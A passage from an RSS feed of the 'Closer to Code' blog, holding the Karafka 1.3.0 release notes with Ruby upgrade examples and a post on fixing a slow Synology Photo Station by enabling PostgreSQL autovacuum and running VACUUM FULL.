+
+					<description><![CDATA[<p>Note: These release notes cover only the major changes. To learn about various bug fixes and changes, please refer to the change logs or check out the list of commits in the main Karafka repository on GitHub. TL;DR If you would prefer to see the changes in the code, here's the upgrade PR from the [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2019/09/karafka-framework-1-3-0-release-notes-ruby-kafka/">Karafka framework 1.3.0 Release Notes (Ruby + Kafka)</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p><strong>Note</strong>: These release notes cover only the major changes. To learn about various bug fixes and changes, please refer to the change logs or check out the list of commits in the main <a href="https://github.com/karafka/karafka/blob/master/CHANGELOG.md">Karafka</a> repository on GitHub.</p>
+
+<h3>TL;DR</h3>
+<p>If you would prefer to see the changes in the code, <a href="https://github.com/karafka/example-app/pull/46">here's the upgrade PR</a> from the example app.</p>
+<p><strong>Note</strong>: Changes above don't include Zeitwerk setup for your non-Rails projects. See <a href="https://github.com/karafka/example-app/commit/3813b279ac68f596e571f6a7011ba75385167da4">this</a> commit for details on how to replace <strong>Karafka::Loader</strong> with Zeitwerk.</p>
+<p><strong>Note</strong>: If you use Sidekiq backend, keep in mind that before an upgrade, you need to consume all of the messages that are already in Redis.</p>
+<h3>Changes (features, incompatibilities, etc)</h3>
+<h4>Auto-reload of code changes in development</h4>
+<p>Up until now, in order to see your code changes within the Karafka process, you would have to restart it. That was really cumbersome as for bigger and more complex Kafka clusters, restart with reconnections and rebalancing could take a significant amount of time. Fortunately, those times are already gone!</p>
+<p>All you need to do is enabling this part of the code before the <code>App.boot</code> in your <code>karafka.rb</code> file:</p>
+<pre class="brush: ruby; title: ; notranslate">
+# For non-Rails app with Zeitwerk loader
+if Karafka::App.env.development?
+  Karafka.monitor.subscribe(
+    Karafka::CodeReloader.new(
+      APP_LOADER
+    )
+  )
+end
+
+# Or for Ruby on Rails
+if Karafka::App.env.development?
+  Karafka.monitor.subscribe(
+    Karafka::CodeReloader.new(
+      *Rails.application.reloaders
+    )
+  )
+end
+</pre>
+<p>and your code changes will be applied after each message/messages batch fetch.</p>
+<p>Keep in mind though, that there are a couple of limitations to it:</p>
+<ul>
+<li>Changes in the routing are NOT reflected. This would require reconnections and would drastically complicate reloading.</li>
+<li>Any background work that you run, outside of the Karafka framework but still within, might not be caught in the reloading.</li>
+<li>If you use in-memory consumer data buffering that spans across multiple batches (or messages in a single message fetch mode), it WON'T work as code reload means re-initializing all of the consumers instances. In cases like that. you will be better, not using the reload mode at all.</li>
+</ul>
+<p>It is also worth pointing out, that if you have a code that should be re-initialized in any way during the reload phase, you can pass it to the <code>Karafka::CodeReloader</code> initializer:</p>
+<pre class="brush: ruby; title: ; notranslate">
+if Karafka::App.env.development?
+  Karafka.monitor.subscribe(
+    Karafka::CodeReloader.new(
+      *Rails.application.reloaders
+    ) { Dry::Events::Publisher.registry.clear }
+  )
+end
+</pre>
+<h4>Parsers are now Deserializers in the routing and accept the whole Karafka::Params::Params object</h4>
+<p>Parsers as a concept, that would be responsible for serialization and deserialization of data violated SRP (see details <a href="https://github.com/karafka/karafka/issues/463">here</a>). From now on, they are separate entities that you can use independently. For the upgrade, just rename <strong>parser</strong> to <strong>deserializer</strong> for each topic you're using in the routes:</p>
+<pre class="brush: ruby; title: ; notranslate">
+App.consumer_groups.draw do
+  consumer_group :batched_group do
+    batch_fetching true
+
+    topic :xml_data do
+      consumer XmlMessagesConsumer
+      batch_consuming false
+      # parser XmlDeserializer.new
+      deserializer XmlDeserializer.new
+    end
+  end
+end
+</pre>
+<p>and make sure, you extract the <code>payload</code> of the message by yourself:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class XmlDeserializer
+  # @param params [Karafka::Params::Params] params to de-serialize
+  # @return [Hash] deserialized xml
+  # @example:
+  #   XmlDeserializer.new.call('&lt;node&gt;n&lt;/node&gt;')
+  def call(params)
+    ::Hash.from_xml(params.payload)
+  end
+end
+</pre>
+<p>For a justification of this change, please refer to <a href="https://github.com/karafka/karafka/pull/534">this</a> pull request.</p>
+<h4>Zeitwerk in favor of Karafka::Loader</h4>
+<p><strong>Note:</strong> You can skip this section if you use Karafka with Ruby on Rails.</p>
+<p>We aren't the best at loading things. Zeitwerk is. That's why we've dropped our custom loader in favor of it.</p>
+<p>Just load your app code in your <strong>karafka.rb</strong> file before configuring the app and you should be ready to go:</p>
+<pre class="brush: ruby; title: ; notranslate">
+APP_LOADER = Zeitwerk::Loader.new
+
+%w[
+  lib
+  app/consumers
+  app/responders
+  app/workers
+].each(&amp;APP_LOADER.method(:push_dir))
+
+APP_LOADER.setup
+APP_LOADER.eager_load
+
+class App &lt; Karafka::App
+  # config here...
+end
+</pre>
+<p>Don't forget to <strong>eager_load</strong> the code or some of the Karafka components might not work as expected.</p>
+<h4>Message payload now available under the 'payload' key without root merge</h4>
+<p>This is probably the biggest change in this release.</p>
+<p>Up until now, your data when received was available in the root scope of each <strong>params</strong> instance in the <strong>#params_batch</strong>.</p>
+<p>It means, that when you've sent a message as followed:</p>
+<pre class="brush: ruby; title: ; notranslate">
+WaterDrop::SyncProducer.call(
+  { login: 'maciek', id: '1' },
+  topic: 'users'
+)
+</pre>
+<p>you would access it like so:</p>
+<pre class="brush: ruby; title: ; notranslate">
+def consume
+  params_batch.each do |params|
+    puts &quot;Hello #{params['login']}!\n&quot;
+  end
+end
+</pre>
+<p>Karafka used to merge your data directly within the <strong>Karafka::Params::Params</strong> object root scope. That was convenient, but not flexible enough. There are some metadata details in the root params scope that could get overwritten, plus in case you would send something else than a JSON hash, let's say an array, you would get an exception and you would have to use a custom parser to bypass that (see <a href="https://github.com/karafka/karafka/wiki/FAQ#i-get-nomethoderror-undefined-method-to_hash-when-receiving-json-that-contains-an-array">this</a> FAQ question).</p>
+<p>Due to that and in order to better separate your incoming data from the rest of the payload (headers, metadata information, etc), from now on, all of your data will be available under the <strong>payload</strong> params key:</p>
+<pre class="brush: ruby; title: ; notranslate">
+def consume
+  params_batch.each do |params|
+    puts &quot;Hello #{params['payload']['login']}!\n&quot;
+    # or
+    puts &quot;Hello #{params.payload['login']}!\n&quot;
+  end
+en
+</pre>
+<p>The same applies to the case when you want to access unparsed data:</p>
+<pre class="brush: ruby; title: ; notranslate">
+def consume
+  params_batch.to_a.each |params|
+    puts &quot;Unparsed details: #{params['payload']}&quot;
+  end
+end
+</pre>
+<h4>Metadata support</h4>
+<p>When in the <strong>batch_fetching</strong> mode, while fetching data from the Kafka cluster, additional information is being received. This details are available using the <strong>#metadata</strong> consumer method:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class UsersConsumer &lt; ApplicationConsumer
+  def consume
+    puts metadata
+    #=&gt; { batch_size: 200, topic: 'events', partition: 2 }
+  end
+end
+</pre>
+<h4>Message headers support</h4>
+<p>In most message systems (JMS, QPID etc), streaming systems and most transport systems(HTTP, TCP), it is typical to have a concept of headers and payload.</p>
+<p>The payload is traditionally for the business object, and headers are traditionally used for transport routing, filtering etc. Headers are most typically key=value pairs.</p>
+<p>Both <strong>WaterDrop</strong> and <strong>Karafka</strong> support now messages headers.</p>
+<pre class="brush: ruby; title: ; notranslate">
+WaterDrop::SyncProducer.call(
+  { login: 'maciek', id: '1' },
+  topic: 'users',
+  headers: { event: 'created' }
+)
+</pre>
+<pre class="brush: ruby; title: ; notranslate">
+# Karafka consumer
+def consume
+  puts params_batch.last.headers #=&gt; { 'event' =&gt; 'created' }
+end
+</pre>
+<h4>RSpec helpers for much easier consumers testing</h4>
+<p>Up until now, in order to test consumers, you would have to know the internal format in which Karafka stores Kafka messages. That is no longer true!</p>
+<p>We've created a new library called <a href="https://github.com/karafka/testing">Karafka-Testing</a>, that will provide you with all the methods to spec out your consumers much easier.</p>
+<h5>Installation</h5>
+<p>Add this gem to your Gemfile in the <strong>test</strong> group:</p>
+<pre class="brush: ruby; title: ; notranslate">
+group :test do
+  gem 'karafka-testing'
+  gem 'rspec'
+end
+</pre>
+<p>and then in your <strong>spec_helper.rb</strong> file:</p>
+<pre class="brush: ruby; title: ; notranslate">
+require 'karafka/testing/rspec/helpers'
+
+RSpec.configure do |config|
+  config.include Karafka::Testing::RSpec::Helpers
+end
+</pre>
+<h5>Usage</h5>
+<p>Once included in your RSpec setup, this library will provide you two methods that you can use with your specs:</p>
+<p>- <strong>#karafka_consumer_for</strong> - this method will create a consumer instance for the desired topic. It <strong>needs</strong> to be set as the spec subject.<br />
+- <strong>#publish_for_karafka</strong> - this method will "send" message to the consumer instance.</p>
+<p><strong>Note</strong>: Messages sent using the `#publish_for_karafka` method won't be sent to Kafka. They will be "virtually" delegated to the created consumer instance so your specs can run without Kafka setup.</p>
+<pre class="brush: ruby; title: ; notranslate">
+RSpec.describe InlineBatchConsumer do
+  # This will create a consumer instance with all the
+  # settings defined for the given topic
+  subject(:consumer) do
+    karafka_consumer_for(:inline_batch_data)
+  end
+
+  let(:nr1_value) { rand }
+  let(:nr2_value) { rand }
+  let(:sum) { nr1_value + nr2_value }
+
+  before do
+    # Sends first message to Karafka consumer
+    publish_for_karafka({ 'number' =&gt; nr1_value }.to_json)
+    # Sends second message to Karafka consumer
+    publish_for_karafka({ 'number' =&gt; nr2_value }.to_json)
+    allow(Karafka.logger).to receive(:info)
+  end
+
+  it 'expects to log a proper message' do
+    expect(Karafka.logger)
+      .to receive(:info).with(
+        &quot;Sum of 2 elements equals to: #{sum}&quot;
+      )
+    consumer.consume
+  end
+end
+</pre>
+<h4>Instrumentation unification</h4>
+<p>We've made some small changed to the default listener and the names of the events that are being published during Karafka runtime flow execution. Please see <a href="https://github.com/karafka/karafka/pull/340/files">this</a> commit for more details.</p>
+<p><strong>Karafka::Instrumentation::Listener</strong> is now <strong>Karafka::Instrumentation::StdoutListener</strong>.</p>
+<p>There has been a rename and a switch to an instantiation version of this listener.</p>
+<pre class="brush: ruby; title: ; notranslate">
+Karafka.monitor.subscribe(
+  # Old
+  Karafka::Instrumentation::Listener
+  # New
+  Karafka::Instrumentation::StdoutListener.new
+)
+</pre>
+<p><strong>Karafka::Instrumentation::ProctitleListener has been added</strong>.</p>
+<p>New instrumentation called <strong>Karafka::Instrumentation::ProctitleListener</strong> has been added. Its purpose is to provide you with a nicer proc title with a descriptive value. In order to use it, please put the following line in your <strong>karafka.rb</strong> boot file:</p>
+<pre class="brush: ruby; title: ; notranslate">
+Karafka.monitor.subscribe(
+  Karafka::Instrumentation::ProctitleListener.new
+)
+</pre>
+<h4>mark_as_consumed divided into mark_as_consumed and mark_as_consumed!</h4>
+<p>A blocking <strong>#mark_as_consumed</strong> method has been split into two:</p>
+<ul>
+<li><strong>#mark_as_consumed</strong> - for a non-blocking eventual offset commitment.</li>
+<li><strong>#mark_as_consumed!</strong> - for a blocking offset commitment that will stop the processing flow to ensure, that the offset has been stored.</li>
+</ul>
+<h4>#payloads for params_batch to extract only payload of objects from the params_batch</h4>
+<p>If you are not interested in the additional `#params` metadata, you can use the `#payloads` method to access only the Kafka messages deserialized payload:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class EventsConsumer &lt; ApplicationConsumer
+  def consume
+    EventStore.store params_batch.payloads
+  end
+end
+</pre>
+<h4>Single consumer class supports more than one topic</h4>
+<p>Since now, you are able to use the same consumer class for multiple topics:</p>
+<pre class="brush: ruby; title: ; notranslate">
+App.consumer_groups.draw do
+  consumer_group :default do
+    topic :users do
+      consumer UsersConsumer
+    end
+
+    topic :admins do
+      consumer UsersConsumer
+    end
+  end
+end
+</pre>
+<p><strong>Note:</strong> you will still have separate instances per each topic partition.</p>
+<h4>Delayed re-connection upon critical failures</h4>
+<p>If a critical failure occurs (network disconnection or anything similar) Karafka will back off and wait for <strong>reconnect_timeout</strong> (defaults to 10s) before attempting to reconnect. This should prevent you from being clogged by errors and logs upon serious problems.</p>
+<h4>Support for Kafka 0.10 dropped in favor of native support for Kafka 0.11</h4>
+<p>Support for Kafka 0.10 has been dropped. Weird things may happen if you decide to use Kafka 0.10 with Karafka 1.3 so just upgrade.</p>
+<h4>Reorganized responders - multiple_usage constrain no longer available</h4>
+<p><strong>multiple_usage</strong> has been removed. Responders won't raise any exception if you decide to send multiple messages to the same topic without declaring that. This feature was a bad idea and was creating a lot of trouble when using responders in a long-running, batched like flows.</p>
+<p>Following code would raise a <strong>Karafka::Errors::InvalidResponderUsageError</strong> error in Karafka 1.2 but will continue to run in Karafka 1.3:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class ExampleResponder &lt; ApplicationResponder
+  topic :regular_topic
+
+  def respond(user, profile)
+    respond_to :regular_topic, user
+    respond_to :regular_topic, user
+  end
+end
+</pre>
+<h4>Exceptions names standardization</h4>
+<p>All the Karafka internal framework exception names end now with an <strong>Error</strong> postfix. Please see this file for the whole <a href="https://github.com/karafka/karafka/blob/master/lib/karafka/errors.rb">list</a> of exceptions.</p>
+<h4>Default fetcher_max_queue_size changed from 100 to 10 to lower max memory usage</h4>
+<p>While Karafka is processing, <a href="https://github.com/zendesk/ruby-kafka">ruby-kafka</a> prebuffers more data under the hood in a separate thread. If you have a big consumer lag, this can cause your Karafka process to prebuffer hundreds or more megabytes of data upfront. Lowering the queue size makes Karafka more predictable by default.</p>
+<h3>Documentation</h3>
+<p>Our <a href="https://github.com/karafka/karafka/wiki">Wiki</a> has been updated accordingly to the 1.3 status. Please notify us if you find any incompatibilities.</p>
+<h3>Getting started with Karafka</h3>
+<p>If you want to get started with Kafka and Karafka as fast as possible, then the best idea is to just clone our example repository:</p>
+<pre class="brush: bash; title: ; notranslate">
+git clone https://github.com/karafka/example-app ./example_app
+</pre>
+<p>then, just bundle install all the dependencies:</p>
+<pre class="brush: bash; title: ; notranslate">
+cd ./example_app
+bundle install
+</pre>
+<p>and follow the instructions from the <a href="https://github.com/karafka/example-app/blob/master/README.md">example app Wiki</a>.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2019/09/karafka-framework-1-3-0-release-notes-ruby-kafka/">Karafka framework 1.3.0 Release Notes (Ruby + Kafka)</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2019/09/karafka-framework-1-3-0-release-notes-ruby-kafka/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Synology DSM 6.2 Photo Station 6 – Failed to Load Data Fix</title>
+		<link>https://mensfeld.pl/2019/07/synology-dsm-6-2-photo-station-6-failed-to-load-data-fix/</link>
+					<comments>https://mensfeld.pl/2019/07/synology-dsm-6-2-photo-station-6-failed-to-load-data-fix/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Thu, 25 Jul 2019 18:51:17 +0000</pubDate>
+				<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Other]]></category>
+		<category><![CDATA[nas]]></category>
+		<category><![CDATA[PostgreSQL]]></category>
+		<category><![CDATA[synology]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=4888</guid>
+
+					<description><![CDATA[<p>I'm a quite happy Synology user. For the past years I've been using it mostly to backup my things, so I didn't pay much of an attention to the fact, that the Photo Station software would get slower and slower up to the point when I would end up with "Failed to load data" message [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2019/07/synology-dsm-6-2-photo-station-6-failed-to-load-data-fix/">Synology DSM 6.2 Photo Station 6 &#8211; Failed to Load Data Fix</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I'm a quite happy Synology user. For the past years I've been using it mostly to backup my things, so I didn't pay much of an attention to the fact, that the Photo Station software would get slower and slower up to the point when I would end up with "<strong>Failed to load data</strong>" message each time I would access it.</p>
+<p>Some articles suggested that you have to drop and re-create the media indexing database to fix it. However, this won't help you in the long run. Your Photo Station 6 database will become bloated once again after a while.</p>
+<p>The reason, why Photo Station 6 gets slower and slower, is the fact that Synology, for any crazy reason disabled the PostgreSQL AutoVacuum functionality. Vacuuming is suppose to keep your database in a good state</p>
+<p>How to fix that once and for all? You need to enable the <strong>PostgreSQL AUTOVACUUM</strong> and for an immediate effect, you should also run the vacuuming manually.</p>
+<p>SSH into your server and then:</p>
+<pre class="brush: bash; title: ; notranslate">
+sudo su
+cd /volume1/@database/pgsql
+vim postgresql.conf
+</pre>
+<p>Within the <code>postgresql.conf</code> file replace (or add if they don't not exist) following settings:</p>
+<pre class="brush: bash; title: ; notranslate">
+wal_buffers =128MB
+autovacuum = on
+checkpoint_segments = 10
+</pre>
+<p>save, exit the file and reboot.</p>
+<p>If you want to run vacuuming manually, log in into the PostgreSQL console:</p>
+<pre class="brush: bash; title: ; notranslate">
+psql -U postgres
+</pre>
+<p>List available databases:</p>
+<pre class="brush: bash; title: ; notranslate">
+postgres=# \l
+                                       List of databases
+    Name     |           Owner            | Encoding  | Collate | Ctype |   Access privileges   
+-------------+----------------------------+-----------+---------+-------+-----------------------
+ mediaserver | MediaIndex                 | SQL_ASCII | C       | C     | 
+ ong         | SynologyApplicationService | SQL_ASCII | C       | C     | 
+ photo       | PhotoStation               | SQL_ASCII | C       | C     | 
+ postgres    | postgres                   | SQL_ASCII | C       | C     | 
+ synosnmp    | postgres                   | SQL_ASCII | C       | C     | 
+ template0   | postgres                   | SQL_ASCII | C       | C     | =c/postgres          +
+             |                            |           |         |       | postgres=CTc/postgres
+ template1   | postgres                   | SQL_ASCII | C       | C     | postgres=CTc/postgres+
+             |                            |           |         |       | =c/postgres
+</pre>
+<p>Connect to the <code>photo</code> DB:</p>
+<pre class="brush: bash; title: ; notranslate">
+postgres=# \c photo;
+You are now connected to database &quot;photo&quot; as user &quot;postgres&quot;.
+</pre>
+<p>Check the tables size by running the following query:</p>
+<pre class="brush: sql; title: ; notranslate">
+SELECT nspname || '.' || relname AS &quot;relation&quot;,
+    pg_size_pretty(pg_total_relation_size(C.oid)) AS &quot;total_size&quot;
+  FROM pg_class C
+  LEFT JOIN pg_namespace N ON (N.oid = C.relnamespace)
+  WHERE nspname NOT IN ('pg_catalog', 'information_schema')
+    AND C.relkind &lt;&gt; 'i'
+    AND nspname !~ '^pg_toast'
+  ORDER BY pg_total_relation_size(C.oid) DESC
+  LIMIT 5;
+</pre>
+<pre class="brush: bash; title: ; notranslate">
+       relation       | total_size 
+----------------------+------------
+ public.photo_image   | 1097 MB
+ public.photo_log     | 5912 kB
+ public.video_convert | 936 kB
+ public.photo_share   | 928 kB
+ public.video         | 864 kB
+(5 rows)
+</pre>
+<p>and the potential vacuuming candidate should be obvious by now:</p>
+<pre class="brush: bash; title: ; notranslate">
+photo=# vacuum full public.photo_image;
+VACUUM
+</pre>
+<p>Re-run the size checking query again just to see 93% size reduction of the images table:</p>
+<pre class="brush: bash; title: ; notranslate">
+       relation       | total_size 
+----------------------+------------
+ public.photo_image   | 72 MB
+ public.photo_log     | 5912 kB
+ public.video_convert | 936 kB
+ public.photo_share   | 928 kB
+ public.video         | 864 kB
+(5 rows)
+</pre>
+<p>After that, everything will work blazing fast!</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2019/07/synology-dsm-6-2-photo-station-6-failed-to-load-data-fix/">Synology DSM 6.2 Photo Station 6 &#8211; Failed to Load Data Fix</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2019/07/synology-dsm-6-2-photo-station-6-failed-to-load-data-fix/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
